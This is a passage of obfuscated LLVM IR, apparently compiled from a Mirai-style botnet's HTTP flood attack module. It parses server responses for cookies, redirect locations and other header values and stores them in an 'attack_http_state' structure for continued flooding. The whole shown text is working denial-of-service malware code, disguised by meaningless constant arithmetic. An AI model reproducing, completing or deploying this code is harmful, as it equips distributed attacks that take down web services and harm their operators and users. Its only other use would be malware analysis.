  %1283 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1284 = load i32, i32* %12, align 4
  %1285 = call i8* @table_retrieve_val(i32 57, i32* null)
  %1286 = call i32 @util_stristr(i8* %1283, i32 %1284, i8* %1285)
  %1287 = icmp ne i32 %1286, -1
  br i1 %1287, label %1288, label %1350

; <label>:1288:                                   ; preds = %1280
  %1289 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1290 = load i32, i32* %12, align 4
  %1291 = call i8* @table_retrieve_val(i32 57, i32* null)
  %1292 = call i32 @util_stristr(i8* %1289, i32 %1290, i8* %1291)
  store i32 %1292, i32* %41, align 4
  %1293 = load i32, i32* %41, align 4
  %1294 = sext i32 %1293 to i64
  %1295 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1294
  %1296 = load i8, i8* %1295, align 1
  %1297 = sext i8 %1296 to i32
  %1298 = icmp eq i32 %1297, 32
  br i1 %1298, label %1299, label %1305

; <label>:1299:                                   ; preds = %1288
  %1300 = load i32, i32* %41, align 4
  %1301 = sub i32 %1300, -1242374290
  %1302 = add i32 %1301, 1
  %1303 = add i32 %1302, -1242374290
  %1304 = add nsw i32 %1300, 1
  store i32 %1303, i32* %41, align 4
  br label %1305

; <label>:1305:                                   ; preds = %1299, %1288
  %1306 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1307 = load i32, i32* %41, align 4
  %1308 = sext i32 %1307 to i64
  %1309 = getelementptr inbounds i8, i8* %1306, i64 %1308
  %1310 = load i32, i32* %12, align 4
  %1311 = load i32, i32* %41, align 4
  %1312 = add i32 %1310, 573746668
  %1313 = sub i32 %1312, %1311
  %1314 = sub i32 %1313, 573746668
  %1315 = sub nsw i32 %1310, %1311
  %1316 = call i32 @util_memsearch(i8* %1309, i32 %1314, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1316, i32* %42, align 4
  %1317 = load i32, i32* %42, align 4
  %1318 = icmp ne i32 %1317, -1
  br i1 %1318, label %1319, label %1349

; <label>:1319:                                   ; preds = %1305
  %1320 = load i32, i32* %41, align 4
  %1321 = sext i32 %1320 to i64
  %1322 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1321
  store i8* %1322, i8** %43, align 8
  %1323 = load i32, i32* %42, align 4
  %1324 = icmp sge i32 %1323, 2
  br i1 %1324, label %1325, label %1330

; <label>:1325:                                   ; preds = %1319
  %1326 = load i32, i32* %42, align 4
  %1327 = sub i32 0, 2
  %1328 = add i32 %1326, %1327
  %1329 = sub nsw i32 %1326, 2
  store i32 %1328, i32* %42, align 4
  br label %1330

; <label>:1330:                                   ; preds = %1325, %1319
  %1331 = load i32, i32* %41, align 4
  %1332 = load i32, i32* %42, align 4
  %1333 = sub i32 %1331, -1536016174
  %1334 = add i32 %1333, %1332
  %1335 = add i32 %1334, -1536016174
  %1336 = add nsw i32 %1331, %1332
  %1337 = sext i32 %1335 to i64
  %1338 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1337
  store i8 0, i8* %1338, align 1
  %1339 = load i8*, i8** %43, align 8
  %1340 = load i8*, i8** %43, align 8
  %1341 = call i32 @util_strlen(i8* %1340)
  %1342 = call i8* @table_retrieve_val(i32 58, i32* null)
  %1343 = call i32 @util_stristr(i8* %1339, i32 %1341, i8* %1342)
  %1344 = icmp ne i32 %1343, 0
  br i1 %1344, label %1345, label %1348

; <label>:1345:                                   ; preds = %1330
  %1346 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1347 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1346, i32 0, i32 13
  store i32 1, i32* %1347, align 4
  br label %1348

; <label>:1348:                                   ; preds = %1345, %1330
  br label %1349

; <label>:1349:                                   ; preds = %1348, %1305
  br label %1350

; <label>:1350:                                   ; preds = %1349, %1280
  %1351 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1352 = load i32, i32* %12, align 4
  %1353 = call i8* @table_retrieve_val(i32 56, i32* null)
  %1354 = call i32 @util_stristr(i8* %1351, i32 %1352, i8* %1353)
  %1355 = icmp ne i32 %1354, -1
  br i1 %1355, label %1356, label %1414

; <label>:1356:                                   ; preds = %1350
  %1357 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1358 = load i32, i32* %12, align 4
  %1359 = call i8* @table_retrieve_val(i32 56, i32* null)
  %1360 = call i32 @util_stristr(i8* %1357, i32 %1358, i8* %1359)
  store i32 %1360, i32* %44, align 4
  %1361 = load i32, i32* %44, align 4
  %1362 = sext i32 %1361 to i64
  %1363 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1362
  %1364 = load i8, i8* %1363, align 1
  %1365 = sext i8 %1364 to i32
  %1366 = icmp eq i32 %1365, 32
  br i1 %1366, label %1367, label %1373

; <label>:1367:                                   ; preds = %1356
  %1368 = load i32, i32* %44, align 4
  %1369 = sub i32 %1368, -433246259
  %1370 = add i32 %1369, 1
  %1371 = add i32 %1370, -433246259
  %1372 = add nsw i32 %1368, 1
  store i32 %1371, i32* %44, align 4
  br label %1373

; <label>:1373:                                   ; preds = %1367, %1356
  %1374 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1375 = load i32, i32* %44, align 4
  %1376 = sext i32 %1375 to i64
  %1377 = getelementptr inbounds i8, i8* %1374, i64 %1376
  %1378 = load i32, i32* %12, align 4
  %1379 = load i32, i32* %44, align 4
  %1380 = add i32 %1378, -508782653
  %1381 = sub i32 %1380, %1379
  %1382 = sub i32 %1381, -508782653
  %1383 = sub nsw i32 %1378, %1379
  %1384 = call i32 @util_memsearch(i8* %1377, i32 %1382, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1384, i32* %45, align 4
  %1385 = load i32, i32* %45, align 4
  %1386 = icmp ne i32 %1385, -1
  br i1 %1386, label %1387, label %1413

; <label>:1387:                                   ; preds = %1373
  %1388 = load i32, i32* %44, align 4
  %1389 = sext i32 %1388 to i64
  %1390 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1389
  store i8* %1390, i8** %46, align 8
  %1391 = load i32, i32* %45, align 4
  %1392 = icmp sge i32 %1391, 2
  br i1 %1392, label %1393, label %1399

; <label>:1393:                                   ; preds = %1387
  %1394 = load i32, i32* %45, align 4
  %1395 = sub i32 %1394, 353183278
  %1396 = sub i32 %1395, 2
  %1397 = add i32 %1396, 353183278
  %1398 = sub nsw i32 %1394, 2
  store i32 %1397, i32* %45, align 4
  br label %1399

; <label>:1399:                                   ; preds = %1393, %1387
  %1400 = load i32, i32* %44, align 4
  %1401 = load i32, i32* %45, align 4
  %1402 = sub i32 0, %1400
  %1403 = sub i32 0, %1401
  %1404 = add i32 %1402, %1403
  %1405 = sub i32 0, %1404
  %1406 = add nsw i32 %1400, %1401
  %1407 = sext i32 %1405 to i64
  %1408 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1407
  store i8 0, i8* %1408, align 1
  %1409 = load i8*, i8** %46, align 8
  %1410 = call i32 @util_atoi(i8* %1409, i32 10)
  %1411 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1412 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1411, i32 0, i32 14
  store i32 %1410, i32* %1412, align 4
  br label %1413

; <label>:1413:                                   ; preds = %1399, %1373
  br label %1417

; <label>:1414:                                   ; preds = %1350
  %1415 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1416 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1415, i32 0, i32 14
  store i32 0, i32* %1416, align 4
  br label %1417

; <label>:1417:                                   ; preds = %1414, %1413
  store i32 0, i32* %37, align 4
  br label %1418

; <label>:1418:                                   ; preds = %1639, %1417
  %1419 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1420 = load i32, i32* %37, align 4
  %1421 = sext i32 %1420 to i64
  %1422 = getelementptr inbounds i8, i8* %1419, i64 %1421
  %1423 = load i32, i32* %12, align 4
  %1424 = call i8* @table_retrieve_val(i32 55, i32* null)
  %1425 = call i32 @util_stristr(i8* %1422, i32 %1423, i8* %1424)
  %1426 = icmp ne i32 %1425, -1
  br i1 %1426, label %1427, label %1432

; <label>:1427:                                   ; preds = %1418
  %1428 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1429 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1428, i32 0, i32 15
  %1430 = load i32, i32* %1429, align 4
  %1431 = icmp slt i32 %1430, 5
  br label %1432

; <label>:1432:                                   ; preds = %1427, %1418
  %1433 = phi i1 [ false, %1418 ], [ %1431, %1427 ]
  br i1 %1433, label %1434, label %1647

; <label>:1434:                                   ; preds = %1432
  %1435 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1436 = load i32, i32* %37, align 4
  %1437 = sext i32 %1436 to i64
  %1438 = getelementptr inbounds i8, i8* %1435, i64 %1437
  %1439 = load i32, i32* %12, align 4
  %1440 = call i8* @table_retrieve_val(i32 55, i32* null)
  %1441 = call i32 @util_stristr(i8* %1438, i32 %1439, i8* %1440)
  store i32 %1441, i32* %47, align 4
  %1442 = load i32, i32* %37, align 4
  %1443 = load i32, i32* %47, align 4
  %1444 = sub i32 %1442, -76544783
  %1445 = add i32 %1444, %1443
  %1446 = add i32 %1445, -76544783
  %1447 = add nsw i32 %1442, %1443
  %1448 = sext i32 %1446 to i64
  %1449 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1448
  %1450 = load i8, i8* %1449, align 1
  %1451 = sext i8 %1450 to i32
  %1452 = icmp eq i32 %1451, 32
  br i1 %1452, label %1453, label %1459

; <label>:1453:                                   ; preds = %1434
  %1454 = load i32, i32* %47, align 4
  %1455 = add i32 %1454, -1666694681
  %1456 = add i32 %1455, 1
  %1457 = sub i32 %1456, -1666694681
  %1458 = add nsw i32 %1454, 1
  store i32 %1457, i32* %47, align 4
  br label %1459

; <label>:1459:                                   ; preds = %1453, %1434
  %1460 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1461 = load i32, i32* %37, align 4
  %1462 = sext i32 %1461 to i64
  %1463 = getelementptr inbounds i8, i8* %1460, i64 %1462
  %1464 = load i32, i32* %47, align 4
  %1465 = sext i32 %1464 to i64
  %1466 = getelementptr inbounds i8, i8* %1463, i64 %1465
  %1467 = load i32, i32* %12, align 4
  %1468 = load i32, i32* %37, align 4
  %1469 = sub i32 0, %1468
  %1470 = add i32 %1467, %1469
  %1471 = sub nsw i32 %1467, %1468
  %1472 = load i32, i32* %47, align 4
  %1473 = sub i32 0, %1472
  %1474 = add i32 %1470, %1473
  %1475 = sub nsw i32 %1470, %1472
  %1476 = call i32 @util_memsearch(i8* %1466, i32 %1474, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1476, i32* %48, align 4
  %1477 = load i32, i32* %48, align 4
  %1478 = icmp ne i32 %1477, -1
  br i1 %1478, label %1479, label %1639

; <label>:1479:                                   ; preds = %1459
  %1480 = load i32, i32* %37, align 4
  %1481 = load i32, i32* %47, align 4
  %1482 = sub i32 0, %1480
  %1483 = sub i32 0, %1481
  %1484 = add i32 %1482, %1483
  %1485 = sub i32 0, %1484
  %1486 = add nsw i32 %1480, %1481
  %1487 = sext i32 %1485 to i64
  %1488 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1487
  store i8* %1488, i8** %49, align 8
  %1489 = load i32, i32* %48, align 4
  %1490 = icmp sge i32 %1489, 2
  br i1 %1490, label %1491, label %1496

; <label>:1491:                                   ; preds = %1479
  %1492 = load i32, i32* %48, align 4
  %1493 = sub i32 0, 2
  %1494 = add i32 %1492, %1493
  %1495 = sub nsw i32 %1492, 2
  store i32 %1494, i32* %48, align 4
  br label %1496

; <label>:1496:                                   ; preds = %1491, %1479
  %1497 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1498 = load i32, i32* %37, align 4
  %1499 = sext i32 %1498 to i64
  %1500 = getelementptr inbounds i8, i8* %1497, i64 %1499
  %1501 = load i32, i32* %47, align 4
  %1502 = sext i32 %1501 to i64
  %1503 = getelementptr inbounds i8, i8* %1500, i64 %1502
  %1504 = load i32, i32* %12, align 4
  %1505 = load i32, i32* %37, align 4
  %1506 = sub i32 %1504, 1782937364
  %1507 = sub i32 %1506, %1505
  %1508 = add i32 %1507, 1782937364
  %1509 = sub nsw i32 %1504, %1505
  %1510 = load i32, i32* %47, align 4
  %1511 = sub i32 %1508, 1661813670
  %1512 = sub i32 %1511, %1510
  %1513 = add i32 %1512, 1661813670
  %1514 = sub nsw i32 %1508, %1510
  %1515 = call i32 @util_memsearch(i8* %1503, i32 %1513, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %1516 = icmp sgt i32 %1515, 0
  br i1 %1516, label %1517, label %1540

; <label>:1517:                                   ; preds = %1496
  %1518 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1519 = load i32, i32* %37, align 4
  %1520 = sext i32 %1519 to i64
  %1521 = getelementptr inbounds i8, i8* %1518, i64 %1520
  %1522 = load i32, i32* %47, align 4
  %1523 = sext i32 %1522 to i64
  %1524 = getelementptr inbounds i8, i8* %1521, i64 %1523
  %1525 = load i32, i32* %12, align 4
  %1526 = load i32, i32* %37, align 4
  %1527 = add i32 %1525, -158004770
  %1528 = sub i32 %1527, %1526
  %1529 = sub i32 %1528, -158004770
  %1530 = sub nsw i32 %1525, %1526
  %1531 = load i32, i32* %47, align 4
  %1532 = sub i32 %1529, -359085645
  %1533 = sub i32 %1532, %1531
  %1534 = add i32 %1533, -359085645
  %1535 = sub nsw i32 %1529, %1531
  %1536 = call i32 @util_memsearch(i8* %1524, i32 %1534, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %1537 = sub i32 0, 1
  %1538 = add i32 %1536, %1537
  %1539 = sub nsw i32 %1536, 1
  store i32 %1538, i32* %48, align 4
  br label %1540

; <label>:1540:                                   ; preds = %1517, %1496
  %1541 = load i32, i32* %37, align 4
  %1542 = load i32, i32* %47, align 4
  %1543 = sub i32 %1541, -1622168803
  %1544 = add i32 %1543, %1542
  %1545 = add i32 %1544, -1622168803
  %1546 = add nsw i32 %1541, %1542
  %1547 = load i32, i32* %48, align 4
  %1548 = sub i32 0, %1545
  %1549 = sub i32 0, %1547
  %1550 = add i32 %1548, %1549
  %1551 = sub i32 0, %1550
  %1552 = add nsw i32 %1545, %1547
  %1553 = sext i32 %1551 to i64
  %1554 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1553
  store i8 0, i8* %1554, align 1
  store i32 0, i32* %10, align 4
  br label %1555

; <label>:1555:                                   ; preds = %1570, %1540
  %1556 = load i32, i32* %10, align 4
  %1557 = load i8*, i8** %49, align 8
  %1558 = call i32 @util_strlen(i8* %1557)
  %1559 = icmp slt i32 %1556, %1558
  br i1 %1559, label %1560, label %1576

; <label>:1560:                                   ; preds = %1555
  %1561 = load i8*, i8** %49, align 8
  %1562 = load i32, i32* %10, align 4
  %1563 = sext i32 %1562 to i64
  %1564 = getelementptr inbounds i8, i8* %1561, i64 %1563
  %1565 = load i8, i8* %1564, align 1
  %1566 = sext i8 %1565 to i32
  %1567 = icmp eq i32 %1566, 61
  br i1 %1567, label %1568, label %1569

; <label>:1568:                                   ; preds = %1560
  br label %1576

; <label>:1569:                                   ; preds = %1560
  br label %1570

; <label>:1570:                                   ; preds = %1569
  %1571 = load i32, i32* %10, align 4
  %1572 = sub i32 %1571, -15636480
  %1573 = add i32 %1572, 1
  %1574 = add i32 %1573, -15636480
  %1575 = add nsw i32 %1571, 1
  store i32 %1574, i32* %10, align 4
  br label %1555

; <label>:1576:                                   ; preds = %1568, %1555
  %1577 = load i8*, i8** %49, align 8
  %1578 = load i32, i32* %10, align 4
  %1579 = sext i32 %1578 to i64
  %1580 = getelementptr inbounds i8, i8* %1577, i64 %1579
  %1581 = load i8, i8* %1580, align 1
  %1582 = sext i8 %1581 to i32
  %1583 = icmp eq i32 %1582, 61
  br i1 %1583, label %1584, label %1638

; <label>:1584:                                   ; preds = %1576
  %1585 = load i32, i32* %10, align 4
  store i32 %1585, i32* %50, align 4
  store i32 0, i32* %51, align 4
  store i32 0, i32* %10, align 4
  br label %1586

; <label>:1586:                                   ; preds = %1605, %1584
  %1587 = load i32, i32* %10, align 4
  %1588 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1589 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1588, i32 0, i32 15
  %1590 = load i32, i32* %1589, align 4
  %1591 = icmp slt i32 %1587, %1590
  br i1 %1591, label %1592, label %1612

; <label>:1592:                                   ; preds = %1586
  %1593 = load i8*, i8** %49, align 8
  %1594 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1595 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1594, i32 0, i32 16
  %1596 = load i32, i32* %10, align 4
  %1597 = sext i32 %1596 to i64
  %1598 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %1595, i64 0, i64 %1597
  %1599 = getelementptr inbounds [128 x i8], [128 x i8]* %1598, i32 0, i32 0
  %1600 = load i32, i32* %50, align 4
  %1601 = call signext i8 @util_strncmp(i8* %1593, i8* %1599, i32 %1600)
  %1602 = icmp ne i8 %1601, 0
  br i1 %1602, label %1603, label %1604

; <label>:1603:                                   ; preds = %1592
  store i32 1, i32* %51, align 4
  br label %1612

; <label>:1604:                                   ; preds = %1592
  br label %1605

; <label>:1605:                                   ; preds = %1604
  %1606 = load i32, i32* %10, align 4
  %1607 = sub i32 0, %1606
  %1608 = sub i32 0, 1
  %1609 = add i32 %1607, %1608
  %1610 = sub i32 0, %1609
  %1611 = add nsw i32 %1606, 1
  store i32 %1610, i32* %10, align 4
  br label %1586

; <label>:1612:                                   ; preds = %1603, %1586
  %1613 = load i32, i32* %51, align 4
  %1614 = icmp ne i32 %1613, 0
  br i1 %1614, label %1637, label %1615

; <label>:1615:                                   ; preds = %1612
  %1616 = load i8*, i8** %49, align 8
  %1617 = call i32 @util_strlen(i8* %1616)
  %1618 = icmp slt i32 %1617, 128
  br i1 %1618, label %1619, label %1636

; <label>:1619:                                   ; preds = %1615
  %1620 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1621 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1620, i32 0, i32 16
  %1622 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1623 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1622, i32 0, i32 15
  %1624 = load i32, i32* %1623, align 4
  %1625 = sext i32 %1624 to i64
  %1626 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %1621, i64 0, i64 %1625
  %1627 = getelementptr inbounds [128 x i8], [128 x i8]* %1626, i32 0, i32 0
  %1628 = load i8*, i8** %49, align 8
  %1629 = call i32 @util_strcpy(i8* %1627, i8* %1628)
  %1630 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1631 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1630, i32 0, i32 15
  %1632 = load i32, i32* %1631, align 4
  %1633 = sub i32 0, 1
  %1634 = sub i32 %1632, %1633
  %1635 = add nsw i32 %1632, 1
  store i32 %1634, i32* %1631, align 4
  br label %1636

; <label>:1636:                                   ; preds = %1619, %1615
  br label %1637

; <label>:1637:                                   ; preds = %1636, %1612
  br label %1638

; <label>:1638:                                   ; preds = %1637, %1576
  br label %1639

; <label>:1639:                                   ; preds = %1638, %1459
  %1640 = load i32, i32* %47, align 4
  %1641 = load i32, i32* %37, align 4
  %1642 = sub i32 0, %1641
  %1643 = sub i32 0, %1640
  %1644 = add i32 %1642, %1643
  %1645 = sub i32 0, %1644
  %1646 = add nsw i32 %1641, %1640
  store i32 %1645, i32* %37, align 4
  br label %1418

; <label>:1647:                                   ; preds = %1432
  %1648 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1649 = load i32, i32* %12, align 4
  %1650 = call i8* @table_retrieve_val(i32 54, i32* null)
  %1651 = call i32 @util_stristr(i8* %1648, i32 %1649, i8* %1650)
  %1652 = icmp ne i32 %1651, -1
  br i1 %1652, label %1653, label %1870

; <label>:1653:                                   ; preds = %1647
  %1654 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1655 = load i32, i32* %12, align 4
  %1656 = call i8* @table_retrieve_val(i32 54, i32* null)
  %1657 = call i32 @util_stristr(i8* %1654, i32 %1655, i8* %1656)
  store i32 %1657, i32* %52, align 4
  %1658 = load i32, i32* %52, align 4
  %1659 = sext i32 %1658 to i64
  %1660 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1659
  %1661 = load i8, i8* %1660, align 1
  %1662 = sext i8 %1661 to i32
  %1663 = icmp eq i32 %1662, 32
  br i1 %1663, label %1664, label %1670

; <label>:1664:                                   ; preds = %1653
  %1665 = load i32, i32* %52, align 4
  %1666 = add i32 %1665, -1156676198
  %1667 = add i32 %1666, 1
  %1668 = sub i32 %1667, -1156676198
  %1669 = add nsw i32 %1665, 1
  store i32 %1668, i32* %52, align 4
  br label %1670

; <label>:1670:                                   ; preds = %1664, %1653
  %1671 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1672 = load i32, i32* %52, align 4
  %1673 = sext i32 %1672 to i64
  %1674 = getelementptr inbounds i8, i8* %1671, i64 %1673
  %1675 = load i32, i32* %12, align 4
  %1676 = load i32, i32* %52, align 4
  %1677 = sub i32 0, %1676
  %1678 = add i32 %1675, %1677
  %1679 = sub nsw i32 %1675, %1676
  %1680 = call i32 @util_memsearch(i8* %1674, i32 %1678, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1680, i32* %53, align 4
  %1681 = load i32, i32* %53, align 4
  %1682 = icmp ne i32 %1681, -1
  br i1 %1682, label %1683, label %1869

; <label>:1683:                                   ; preds = %1670
  %1684 = load i32, i32* %52, align 4
  %1685 = sext i32 %1684 to i64
  %1686 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1685
  store i8* %1686, i8** %54, align 8
  %1687 = load i32, i32* %53, align 4
  %1688 = icmp sge i32 %1687, 2
  br i1 %1688, label %1689, label %1695

; <label>:1689:                                   ; preds = %1683
  %1690 = load i32, i32* %53, align 4
  %1691 = sub i32 %1690, -2085333822
  %1692 = sub i32 %1691, 2
  %1693 = add i32 %1692, -2085333822
  %1694 = sub nsw i32 %1690, 2
  store i32 %1693, i32* %53, align 4
  br label %1695

; <label>:1695:                                   ; preds = %1689, %1683
  %1696 = load i32, i32* %52, align 4
  %1697 = load i32, i32* %53, align 4
  %1698 = sub i32 %1696, -819656013
  %1699 = add i32 %1698, %1697
  %1700 = add i32 %1699, -819656013
  %1701 = add nsw i32 %1696, %1697
  %1702 = sext i32 %1700 to i64
  %1703 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1702
  store i8 0, i8* %1703, align 1
  %1704 = load i32, i32* %53, align 4
  %1705 = sub i32 0, 1
  %1706 = sub i32 %1704, %1705
  %1707 = add nsw i32 %1704, 1
  store i32 %1706, i32* %53, align 4
  %1708 = load i8*, i8** %54, align 8
  %1709 = load i32, i32* %53, align 4
  %1710 = call i32 @util_memsearch(i8* %1708, i32 %1709, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i32 0, i32 0), i32 4)
  %1711 = icmp eq i32 %1710, 4
  br i1 %1711, label %1712, label %1820

; <label>:1712:                                   ; preds = %1695
  store i32 7, i32* %10, align 4
  %1713 = load i8*, i8** %54, align 8
  %1714 = getelementptr inbounds i8, i8* %1713, i64 4
  %1715 = load i8, i8* %1714, align 1
  %1716 = sext i8 %1715 to i32
  %1717 = icmp eq i32 %1716, 115
  br i1 %1717, label %1718, label %1724

; <label>:1718:                                   ; preds = %1712
  %1719 = load i32, i32* %10, align 4
  %1720 = sub i32 %1719, 984895042
  %1721 = add i32 %1720, 1
  %1722 = add i32 %1721, 984895042
  %1723 = add nsw i32 %1719, 1
  store i32 %1722, i32* %10, align 4
  br label %1724

; <label>:1724:                                   ; preds = %1718, %1712
  %1725 = load i8*, i8** %54, align 8
  %1726 = load i8*, i8** %54, align 8
  %1727 = load i32, i32* %10, align 4
  %1728 = sext i32 %1727 to i64
  %1729 = getelementptr inbounds i8, i8* %1726, i64 %1728
  %1730 = load i32, i32* %53, align 4
  %1731 = load i32, i32* %10, align 4
  %1732 = sub i32 %1730, 311854517
  %1733 = sub i32 %1732, %1731
  %1734 = add i32 %1733, 311854517
  %1735 = sub nsw i32 %1730, %1731
  %1736 = sext i32 %1734 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %1725, i8* %1729, i64 %1736, i32 1, i1 false)
  store i32 0, i32* %10, align 4
  br label %1737

; <label>:1737:                                   ; preds = %1758, %1724
  %1738 = load i8*, i8** %54, align 8
  %1739 = load i32, i32* %10, align 4
  %1740 = sext i32 %1739 to i64
  %1741 = getelementptr inbounds i8, i8* %1738, i64 %1740
  %1742 = load i8, i8* %1741, align 1
  %1743 = sext i8 %1742 to i32
  %1744 = icmp ne i32 %1743, 0
  br i1 %1744, label %1745, label %1765

; <label>:1745:                                   ; preds = %1737
  %1746 = load i8*, i8** %54, align 8
  %1747 = load i32, i32* %10, align 4
  %1748 = sext i32 %1747 to i64
  %1749 = getelementptr inbounds i8, i8* %1746, i64 %1748
  %1750 = load i8, i8* %1749, align 1
  %1751 = sext i8 %1750 to i32
  %1752 = icmp eq i32 %1751, 47
  br i1 %1752, label %1753, label %1758

; <label>:1753:                                   ; preds = %1745
  %1754 = load i8*, i8** %54, align 8
  %1755 = load i32, i32* %10, align 4
  %1756 = sext i32 %1755 to i64
  %1757 = getelementptr inbounds i8, i8* %1754, i64 %1756
  store i8 0, i8* %1757, align 1
  br label %1765

; <label>:1758:                                   ; preds = %1745
  %1759 = load i32, i32* %10, align 4
  %1760 = sub i32 0, %1759
  %1761 = sub i32 0, 1
  %1762 = add i32 %1760, %1761
  %1763 = sub i32 0, %1762
  %1764 = add nsw i32 %1759, 1
  store i32 %1763, i32* %10, align 4
  br label %1737

; <label>:1765:                                   ; preds = %1753, %1737
  %1766 = load i8*, i8** %54, align 8
  %1767 = call i32 @util_strlen(i8* %1766)
  %1768 = icmp sgt i32 %1767, 0
  br i1 %1768, label %1769, label %1779

; <label>:1769:                                   ; preds = %1765
  %1770 = load i8*, i8** %54, align 8
  %1771 = call i32 @util_strlen(i8* %1770)
  %1772 = icmp slt i32 %1771, 128
  br i1 %1772, label %1773, label %1779

; <label>:1773:                                   ; preds = %1769
  %1774 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1775 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1774, i32 0, i32 7
  %1776 = getelementptr inbounds [129 x i8], [129 x i8]* %1775, i32 0, i32 0
  %1777 = load i8*, i8** %54, align 8
  %1778 = call i32 @util_strcpy(i8* %1776, i8* %1777)
  br label %1779

; <label>:1779:                                   ; preds = %1773, %1769, %1765
  %1780 = load i8*, i8** %54, align 8
  %1781 = load i32, i32* %10, align 4
  %1782 = add i32 %1781, 1636264843
  %1783 = add i32 %1782, 1
  %1784 = sub i32 %1783, 1636264843
  %1785 = add nsw i32 %1781, 1
  %1786 = sext i32 %1784 to i64
  %1787 = getelementptr inbounds i8, i8* %1780, i64 %1786
  %1788 = call i32 @util_strlen(i8* %1787)
  %1789 = icmp slt i32 %1788, 256
  br i1 %1789, label %1790, label %1819

; <label>:1790:                                   ; preds = %1779
  %1791 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1792 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1791, i32 0, i32 6
  %1793 = getelementptr inbounds [257 x i8], [257 x i8]* %1792, i32 0, i32 0
  %1794 = getelementptr inbounds i8, i8* %1793, i64 1
  call void @util_zero(i8* %1794, i32 255)
  %1795 = load i8*, i8** %54, align 8
  %1796 = load i32, i32* %10, align 4
  %1797 = sub i32 0, 1
  %1798 = sub i32 %1796, %1797
  %1799 = add nsw i32 %1796, 1
  %1800 = sext i32 %1798 to i64
  %1801 = getelementptr inbounds i8, i8* %1795, i64 %1800
  %1802 = call i32 @util_strlen(i8* %1801)
  %1803 = icmp sgt i32 %1802, 0
  br i1 %1803, label %1804, label %1818

; <label>:1804:                                   ; preds = %1790
  %1805 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1806 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1805, i32 0, i32 6
  %1807 = getelementptr inbounds [257 x i8], [257 x i8]* %1806, i32 0, i32 0
  %1808 = getelementptr inbounds i8, i8* %1807, i64 1
  %1809 = load i8*, i8** %54, align 8
  %1810 = load i32, i32* %10, align 4
  %1811 = add i32 %1810, 1943236529
  %1812 = add i32 %1811, 1
  %1813 = sub i32 %1812, 1943236529
  %1814 = add nsw i32 %1810, 1
  %1815 = sext i32 %1813 to i64
